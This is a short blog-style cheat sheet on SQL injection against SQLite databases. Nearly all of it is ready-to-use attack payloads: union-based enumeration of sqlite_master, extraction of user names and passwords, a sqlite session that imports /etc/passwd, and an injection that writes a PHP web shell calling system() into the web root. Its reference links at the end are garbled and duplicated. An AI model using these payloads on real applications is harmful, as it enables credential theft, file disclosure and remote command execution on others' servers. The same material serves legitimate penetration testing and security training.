---
layout: post
title: SQL Injection - SQLite
description: SQL Injection - SQLite
summary: SQL Injection - SQLite
tags: [sqli,db,enum]
minute: 1
---
## Databases
```
sqlite_master
```

## Quick Detection
```sql
-- check version
user=foo' and 1=2 union select all 1,2,3,sqlite_version();--&password=abc
```

## Reading a file
```sql
sqlite>
sqlite> CREATE TABLE pwn.data (data TEXT);
sqlite> .tables
data      pwn.data
sqlite> .import /etc/passwd data
sqlite> select * from data;
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
......
......
sqlite> .tables
data       pwn.data   pwn.shell  shell    
sqlite> DROP TABLE pwn.shell;
```

# Payloads
```sql
-- getting table names
user=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master;--&password=abc
user=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--&password=ab

-- extracting column names
user=foo' UNION SELECT sql,2,3,4 from sqlite_master where name='users';--&password=abc

-- getting a username and a password
user=foo' UNION SELECT name,2,3,password from users--&password=abc
user=foo' UNION SELECT name,2,3,password from users limit 2 offset 10--&password=abc

-- get info for lucas washington
user=foo' UNION SELECT name,2,3,password from users where name like '%lucas_%'--&password=abc

-- planting a php file
?id=bob’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;--
```

## Reference
* [PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
* [Injecting SQLite database
based application](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf[Injecting SQLite database
based application](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)